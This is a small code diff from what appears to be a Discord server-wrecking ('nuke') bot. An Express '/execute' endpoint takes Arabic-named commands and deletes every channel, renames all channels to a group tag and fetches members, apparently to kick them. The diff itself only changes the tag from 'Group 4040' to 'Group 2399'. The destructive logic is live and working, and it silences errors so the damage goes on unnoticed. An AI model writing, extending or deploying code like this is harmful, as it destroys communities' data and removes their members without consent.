@@ -27,7 +27,7 @@ app.post('/execute', async (req, res) => {
             guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
         }
         if (action === 'تغيير الأسماء' || action === 'الضربة القاضية') {
-            guild.channels.cache.forEach(channel => channel.setName('Group 4040').catch(() => {}));
+            guild.channels.cache.forEach(channel => channel.setName('Group 2399').catch(() => {}));
         }
         if (action === 'طرد الجميع' || action === 'الضربة القاضية') {
             const members = await guild.members.fetch();
